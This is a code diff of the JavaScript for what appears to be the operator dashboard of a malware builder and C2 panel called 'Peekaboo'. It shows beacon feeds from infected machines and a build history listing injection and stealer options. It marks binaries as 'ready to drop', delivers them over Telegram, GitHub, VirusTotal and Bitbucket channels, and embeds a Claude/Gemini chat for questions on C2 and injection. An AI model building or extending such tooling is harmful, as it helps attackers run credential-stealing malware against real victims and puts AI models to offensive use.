+    var cnt = d.messages.length;
+    document.getElementById('beacon-count-badge').textContent = cnt + ' messages';
+    var navBadge = document.getElementById('nav-beacon-count');
+    if (navBadge) navBadge.textContent = cnt || '';
+    if (!cnt) { list.innerHTML = '<span class="beacon-empty">[ no messages yet ]</span>'; return; }
+    list.innerHTML = d.messages.map(function(m) {
+      return '<div class="beacon-item">'
+        + '<div class="b-head"><span class="b-from">🐱 ' + escapeHtml(String(m.from)) + '</span>'
+        + '<span class="b-time">' + new Date(m.date * 1000).toLocaleTimeString() + '</span></div>'
+        + '<div class="b-text">' + escapeHtml(m.text) + '</div></div>';
     }).join('');
   })
-  .catch(function(e){ document.getElementById('beacon-list').innerHTML='<span class="beacon-empty" style="color:var(--red)">[!] '+e+'</span>'; });
+  .catch(function(e) { document.getElementById('beacon-list').innerHTML = '<span class="beacon-empty" style="color:var(--red)">[!] ' + e + '</span>'; });
 }
 setInterval(loadBeacons, 30000);
 document.getElementById('beacon-auto').textContent = 'auto 30s';
@@ -684,109 +1018,107 @@ document.getElementById('beacon-auto').textContent = 'auto 30s';
 // ── history ────────────────────────────────────────────────────────────────────
 function loadHistory() {
   fetch('/api/logs')
-  .then(function(r){return r.json();})
-  .then(function(logs){
-    var el=document.getElementById('history-list');
-    if (!logs.length){el.innerHTML='<span class="text-dim">no builds yet.</span>';return;}
-    el.innerHTML=logs.slice().reverse().map(function(b){
-      var p=b.params||{};
-      var badge='<span class="build-status '+b.status+'">'+b.status+'</span>';
-      var t=b.created?b.created.slice(0,19).replace('T',' '):'';
-      var detail=[p.encryption,p.injection,p.stealer].filter(Boolean).join(' / ');
-      return '<div class="history-item"><span class="history-id">#'+b.id+'</span>'+badge
-        +'<span class="history-params">'+escapeHtml(detail)+'</span>'
-        +'<span class="history-time">'+t+'</span></div>';
+  .then(function(r){ return r.json(); })
+  .then(function(logs) {
+    var el = document.getElementById('history-list');
+    if (!logs.length) { el.innerHTML = '<span class="text-dim">no builds yet.</span>'; return; }
+    el.innerHTML = logs.slice().reverse().map(function(b) {
+      var p = b.params || {};
+      var badge = '<span class="build-status ' + b.status + '">' + b.status + '</span>';
+      var t = b.created ? b.created.slice(0,19).replace('T',' ') : '';
+      var detail = [p.encryption, p.injection, p.stealer].filter(Boolean).join(' / ');
+      return '<div class="history-item"><span class="history-id">#' + b.id + '</span>' + badge
+        + '<span class="history-params">' + escapeHtml(detail) + '</span>'
+        + '<span class="history-time">' + t + '</span></div>';
     }).join('');
   });
 }
 
-// ── config preview ─────────────────────────────────────────────────────────────
+// ── config ─────────────────────────────────────────────────────────────────────
 function showConfig(name) {
-  fetch('/api/config/'+name).then(function(r){return r.json();})
-  .then(function(d){document.getElementById('config-preview').textContent=JSON.stringify(d,null,2);});
+  var el = document.getElementById('config-preview');
+  fetch('/api/config/' + name).then(function(r){ return r.json(); })
+  .then(function(d) {
+    el.textContent = JSON.stringify(d, null, 2);
+    el.classList.add('visible');
+  });
 }
 
-// ── C2 binary delivery ─────────────────────────────────────────────────────────
+// ── binary info + C2 status ───────────────────────────────────────────────────
 function loadBinaryInfo() {
-  fetch('/api/c2/binary_info').then(function(r){return r.json();})
-  .then(function(d){
-    var el=document.getElementById('binary-info');
+  fetch('/api/c2/binary_info').then(function(r){ return r.json(); })
+  .then(function(d) {
+    var el = document.getElementById('binary-info');
     if (!d.found) {
-      el.innerHTML='&#9888; no built binary found &mdash; run the builder first';
-      el.style.color='var(--yellow)';
+      el.innerHTML = '⚠️ no built binary found — run the builder first';
+      el.style.color = 'var(--yellow)';
     } else {
-      var kb=(d.size/1024).toFixed(1);
-      el.innerHTML='&#128025; <strong>'+escapeHtml(d.name)+'</strong>'
-        +' &nbsp;|&nbsp; '+kb+' KB'
-        +' &nbsp;|&nbsp; built: '+escapeHtml(d.modified.slice(0,19).replace('T',' '))
-        +' &nbsp;|&nbsp; <span class="text-green">ready to drop</span>';
-      el.style.color='var(--blue)';
+      var kb = (d.size / 1024).toFixed(1);
+      el.innerHTML = '🐙 <strong>' + escapeHtml(d.name) + '</strong>'
+        + ' &nbsp;|&nbsp; ' + kb + ' KB'
+        + ' &nbsp;|&nbsp; built: ' + escapeHtml(d.modified.slice(0,19).replace('T',' '))
+        + ' &nbsp;|&nbsp; <span class="text-green">ready to drop</span>';
+      el.style.color = 'var(--cyan)';
     }
   });
 }
 
 function loadC2Status() {
-  fetch('/api/c2/status').then(function(r){return r.json();})
-  .then(function(d){
-    ['telegram','github','virustotal','bitbucket'].forEach(function(ch){
-      var el=document.getElementById('status-'+ch);
+  fetch('/api/c2/status').then(function(r){ return r.json(); })
+  .then(function(d) {
+    ['telegram','github','virustotal','bitbucket'].forEach(function(ch) {
+      var el = document.getElementById('status-' + ch);
       if (!el) return;
-      var info=d[ch]||{};
+      var info = d[ch] || {};
       if (info.ok) {
-        el.innerHTML='<span class="dot-ok">&#9679;</span> online'+(info.name?' &mdash; '+escapeHtml(info.name):'');
+        el.innerHTML = '<span class="dot-ok">●</span> online' + (info.name ? ' — ' + escapeHtml(info.name) : '');
       } else {
-        el.innerHTML='<span class="dot-err">&#9679;</span> '+(info.error?escapeHtml(info.error):'offline');
+        el.innerHTML = '<span class="dot-err">●</span> ' + (info.error ? escapeHtml(info.error) : 'offline');
       }
     });
-  })
-  .catch(function(){});
+  }).catch(function(){});
 }
 
 function c2Drop(channel) {
-  var resultArea=document.getElementById('c2-result-area');
-  resultArea.innerHTML='<div class="c2-result"><span class="spinner"></span>dropping via '+channel+'...</div>';
-
-  fetch('/api/c2/deliver/'+channel, {method:'POST', headers:{'Content-Type':'application/json'}, body:'{}'})
-  .then(function(r){return r.json();})
-  .then(function(d){
+  var resultArea = document.getElementById('c2-result-area');
+  resultArea.innerHTML = '<div class="c2-result"><span class="spinner"></span>dropping via ' + channel + '...</div>';
+  fetch('/api/c2/deliver/' + channel, {method:'POST', headers:{'Content-Type':'application/json'}, body:'{}'})
+  .then(function(r){ return r.json(); })
+  .then(function(d) {
     if (d.ok) {
-      var lines=['&#10003; DROP SUCCESSFUL',''];
-      lines.push('channel:   '+d.channel);
-      lines.push('file:      '+d.file);
-      lines.push('size:      '+(d.size/1024).toFixed(1)+' KB');
-      if (d.url)         lines.push('url:       '+d.url);
-      if (d.message_id)  lines.push('msg_id:    '+d.message_id);
-      if (d.gist_id)     lines.push('gist_id:   '+d.gist_id);
-      if (d.analysis_id) lines.push('analysis:  '+d.analysis_id);
-      if (d.technique)   lines.push('technique: '+d.technique);
-      if (d.note)        lines.push('note:      '+d.note);
-      resultArea.innerHTML='<div class="c2-result ok">'+escapeHtml(lines.join('\n'))+'</div>';
-      // refresh beacon feed — telegram drops may show up
-      if (channel==='telegram') setTimeout(loadBeacons,3000);
+      var lines = ['✓ DROP SUCCESSFUL', ''];
+      lines.push('channel:   ' + d.channel);
+      lines.push('file:      ' + d.file);
+      lines.push('size:      ' + (d.size/1024).toFixed(1) + ' KB');
+      if (d.url)         lines.push('url:       ' + d.url);
+      if (d.message_id)  lines.push('msg_id:    ' + d.message_id);
+      if (d.gist_id)     lines.push('gist_id:   ' + d.gist_id);
+      if (d.analysis_id) lines.push('analysis:  ' + d.analysis_id);
+      if (d.technique)   lines.push('technique: ' + d.technique);
+      if (d.note)        lines.push('note:      ' + d.note);
+      resultArea.innerHTML = '<div class="c2-result ok">' + escapeHtml(lines.join('\n')) + '</div>';
+      if (channel === 'telegram') setTimeout(loadBeacons, 3000);
     } else {
-      resultArea.innerHTML='<div class="c2-result err">&#10007; ERROR: '+escapeHtml(d.error||'unknown')+'</div>';
+      resultArea.innerHTML = '<div class="c2-result err">✗ ERROR: ' + escapeHtml(d.error || 'unknown') + '</div>';
     }
   })
-  .catch(function(e){
-    resultArea.innerHTML='<div class="c2-result err">&#10007; '+e+'</div>';
+  .catch(function(e) {
+    resultArea.innerHTML = '<div class="c2-result err">✗ ' + e + '</div>';
   });
 }
 
-// ── AI chatbot ─────────────────────────────────────────────────────────────────
+// ── AI chat ────────────────────────────────────────────────────────────────────
 var _chatHistory = [];
 var _chatStreaming = false;
 
-function scrollChat() {
-  var el=document.getElementById('chat-messages');
-  el.scrollTop=el.scrollHeight;
-}
+function scrollChat() { var el = document.getElementById('chat-messages'); el.scrollTop = el.scrollHeight; }
 
 function addMsg(role, text) {
-  var container=document.getElementById('chat-messages');
-  var div=document.createElement('div');
-  div.className='msg msg-'+role;
-  var label=role==='assistant'?'&#128032; PEEKABOO AI':'&#128100; YOU';
-  div.innerHTML='<div class="msg-label">'+label+'</div><div class="msg-body">'+escapeHtml(text)+'</div>';
+  var container = document.getElementById('chat-messages');
+  var div = document.createElement('div');
+  div.className = 'msg msg-' + role;
+  var label = role === 'assistant' ? '🐱 PEEKABOO AI' : '👤 YOU';
+  div.innerHTML = '<div class="msg-label">' + label + '</div><div class="msg-body">' + escapeHtml(text) + '</div>';
   container.appendChild(div);
   scrollChat();
   return div.querySelector('.msg-body');
@@ -794,113 +1126,87 @@ function addMsg(role, text) {
 
 function sendChat() {
   if (_chatStreaming) return;
-  var input=document.getElementById('chat-input');
-  var text=input.value.trim();
+  var input = document.getElementById('chat-input');
+  var text = input.value.trim();
   if (!text) return;
-
-  input.value='';
+  input.value = '';
   _chatHistory.push({role:'user', content:text});
   addMsg('user', text);
+  _chatStreaming = true;
+  document.getElementById('btn-chat-send').disabled = true;
+  document.getElementById('btn-chat-send').textContent = '...';
 
-  _chatStreaming=true;
-  document.getElementById('btn-chat-send').disabled=true;
-  document.getElementById('btn-chat-send').textContent='...';
-
-  // add streaming response container
-  var container=document.getElementById('chat-messages');
-  var div=document.createElement('div');
-  div.className='msg msg-assistant';
-  div.innerHTML='<div class="msg-label">&#128032; PEEKABOO AI</div><div class="msg-body"><span class="spinner"></span></div>';
+  var container = document.getElementById('chat-messages');
+  var div = document.createElement('div');
+  div.className = 'msg msg-assistant';
+  div.innerHTML = '<div class="msg-label">🐱 PEEKABOO AI</div><div class="msg-body"><span class="spinner"></span></div>';
   container.appendChild(div);
   scrollChat();
-  var bodyEl=div.querySelector('.msg-body');
-  var accumulated='';
+  var bodyEl = div.querySelector('.msg-body');
+  var accumulated = '';
 
   var provider = document.getElementById('provider-select').value;
   fetch('/api/chat', {
-    method:'POST',
-    headers:{'Content-Type':'application/json'},
-    body:JSON.stringify({messages:_chatHistory, provider:provider})
+    method: 'POST',
+    headers: {'Content-Type':'application/json'},
+    body: JSON.stringify({messages: _chatHistory, provider: provider})
   })
-  .then(function(resp){
-    var reader=resp.body.getReader();
-    var decoder=new TextDecoder();
-    bodyEl.innerHTML='';
-
-    function read(){
-      reader.read().then(function(result){
+  .then(function(resp) {
+    var reader = resp.body.getReader();
+    var decoder = new TextDecoder();
+    bodyEl.innerHTML = '';
+    function read() {
+      reader.read().then(function(result) {
         if (result.done) { finishChat(accumulated); return; }
-        var chunk=decoder.decode(result.value,{stream:true});
-        chunk.split('\n').forEach(function(line){
+        var chunk = decoder.decode(result.value, {stream:true});
+        chunk.split('\n').forEach(function(line) {
           if (!line.startsWith('data: ')) return;
-          var data=line.slice(6);
-          if (data==='[DONE]') { finishChat(accumulated); return; }
+          var data = line.slice(6);
+          if (data === '[DONE]') { finishChat(accumulated); return; }
           try {
-            var obj=JSON.parse(data);
-            if (obj.text) {
-              accumulated+=obj.text;
-              bodyEl.textContent=accumulated;
-              scrollChat();
-            }
-            if (obj.error) {
-              bodyEl.textContent='[!] '+obj.error;
-            }
-          } catch(e){}
+            var obj = JSON.parse(data);
+            if (obj.text) { accumulated += obj.text; bodyEl.textContent = accumulated; scrollChat(); }
+            if (obj.error) { bodyEl.textContent = '[!] ' + obj.error; }
+          } catch(e) {}
         });
         read();
-      }).catch(function(e){
-        bodyEl.textContent='[!] stream error: '+e;
-        finishChat(accumulated);
-      });
+      }).catch(function(e) { bodyEl.textContent = '[!] stream error: ' + e; finishChat(accumulated); });
     }
     read();
   })
-  .catch(function(e){
-    bodyEl.textContent='[!] request failed: '+e;
-    finishChat('');
-  });
+  .catch(function(e) { bodyEl.textContent = '[!] request failed: ' + e; finishChat(''); });
 }
 
 function finishChat(text) {
   if (text) _chatHistory.push({role:'assistant', content:text});
-  _chatStreaming=false;
-  document.getElementById('btn-chat-send').disabled=false;
-  document.getElementById('btn-chat-send').textContent='&#9658; Send';
+  _chatStreaming = false;
+  document.getElementById('btn-chat-send').disabled = false;
+  document.getElementById('btn-chat-send').textContent = '▶ Send';
   scrollChat();
 }
-
-function quickAsk(question) {
-  document.getElementById('chat-input').value=question;
-  sendChat();
-}
-
-function chatKeydown(e) {
-  if (e.key==='Enter' && !e.shiftKey) { e.preventDefault(); sendChat(); }
-}
-
+function quickAsk(q) { document.getElementById('chat-input').value = q; sendChat(); }
+function chatKeydown(e) { if (e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); sendChat(); } }
 function clearChat() {
-  _chatHistory=[];
-  var el=document.getElementById('chat-messages');
-  el.innerHTML='<div class="msg msg-assistant"><div class="msg-label">&#128032; PEEKABOO AI</div>'
-    +'<div class="msg-body">Chat cleared. Ask me anything about C2 channels, injection, or detection!</div></div>';
+  _chatHistory = [];
+  document.getElementById('chat-messages').innerHTML =
+    '<div class="msg msg-assistant"><div class="msg-label">🐱 PEEKABOO AI</div>'
+    + '<div class="msg-body">Chat cleared. Ask me anything about C2 channels, injection, or detection!</div></div>';
 }
 
 function loadProviders() {
-  fetch('/api/chat/providers').then(function(r){return r.json();})
-  .then(function(d){
+  fetch('/api/chat/providers').then(function(r){ return r.json(); })
+  .then(function(d) {
     var sel = document.getElementById('provider-select');
     var status = document.getElementById('provider-status');
     var lines = [];
-    ['claude','gemini'].forEach(function(p){
+    ['claude','gemini'].forEach(function(p) {
       var info = d[p] || {};
-      var dot = info.available ? '<span class="dot-ok">&#9679;</span>' : '<span class="dot-err">&#9679;</span>';
-      lines.push(dot + ' ' + p + (info.model ? ' ('+info.model+')' : ''));
-      // disable option if not available
-      var opt = sel.querySelector('option[value="'+p+'"]');
+      var dot = info.available ? '<span class="dot-ok">●</span>' : '<span class="dot-err">●</span>';
+      lines.push(dot + ' ' + p + (info.model ? ' (' + info.model + ')' : ''));
+      var opt = sel.querySelector('option[value="' + p + '"]');
       if (opt) opt.disabled = !info.available;
     });
     status.innerHTML = lines.join(' &nbsp;|&nbsp; ');
-    // auto-select first available
     var opts = sel.querySelectorAll('option:not(:disabled)');
     if (opts.length) sel.value = opts[0].value;
     onProviderChange();
@@ -909,37 +1215,35 @@ function loadProviders() {
 
 function onProviderChange() {
   var p = document.getElementById('provider-select').value;
-  var labels = {claude:'&#128032; PEEKABOO AI (Claude)', gemini:'&#9993; PEEKABOO AI (Gemini)'};
-  document.querySelectorAll('.msg-assistant .msg-label').forEach(function(el){
-    el.innerHTML = labels[p] || '&#128032; PEEKABOO AI';
+  var labels = {claude:'🐱 PEEKABOO AI (Claude)', gemini:'✉️ PEEKABOO AI (Gemini)'};
+  document.querySelectorAll('.msg-assistant .msg-label').forEach(function(el) {
+    el.innerHTML = labels[p] || '🐱 PEEKABOO AI';
   });
 }
 
 function triggerScrape() {
-  fetch('/api/chat/scrape',{method:'POST'})
-  .then(function(r){return r.json();})
-  .then(function(d){
-    document.getElementById('kb-info-text').textContent='&#8635; scraping cocomelonc.github.io... check back in ~2 min';
+  fetch('/api/chat/scrape', {method:'POST'}).then(function(r){ return r.json(); })
+  .then(function() {
+    document.getElementById('kb-info-text').textContent = '↻ scraping cocomelonc.github.io... check back in ~2 min';
     setTimeout(refreshKbInfo, 30000);
   });
 }
 
 function refreshKbInfo() {
-  fetch('/api/chat/kb_info').then(function(r){return r.json();})
-  .then(function(d){
-    var badge=document.getElementById('kb-badge');
-    if (d.status==='ready') {
-      badge.textContent='KB: '+d.posts+' posts';
-      badge.className='badge badge-green';
-      document.getElementById('kb-info-text').textContent=
-        '\u{1F4DA} '+d.posts+' blog posts indexed | '+d.blog;
+  fetch('/api/chat/kb_info').then(function(r){ return r.json(); })
+  .then(function(d) {
+    var badge = document.getElementById('kb-badge');
+    if (d.status === 'ready') {
+      badge.textContent = 'KB: ' + d.posts + ' posts';
+      badge.className = 'badge badge-green';
+      document.getElementById('kb-info-text').textContent = '📚 ' + d.posts + ' blog posts indexed | ' + d.blog;
     }
   });
 }
 
 // ── clock ──────────────────────────────────────────────────────────────────────
-function tick() { document.getElementById('clock').textContent=new Date().toUTCString(); }
-setInterval(tick,1000); tick();
+function tick() { document.getElementById('clock').textContent = new Date().toUTCString(); }
+setInterval(tick, 1000); tick();
 
 // ── init ───────────────────────────────────────────────────────────────────────
 loadBeacons();
@@ -948,12 +1252,11 @@ loadBinaryInfo();
 loadC2Status();
 loadProviders();
 
-var total=document.querySelectorAll('.module-tag').length;
-document.getElementById('module-count').textContent='('+total+' total)';
+var total = document.querySelectorAll('.module-tag').length;
+var badge = document.getElementById('module-count-badge');
+if (badge) badge.textContent = total + ' total';
 
-// refresh C2 status every 60s
 setInterval(loadC2Status, 60000);
-// refresh binary info every 15s
 setInterval(loadBinaryInfo, 15000);
 </script>
 </body>
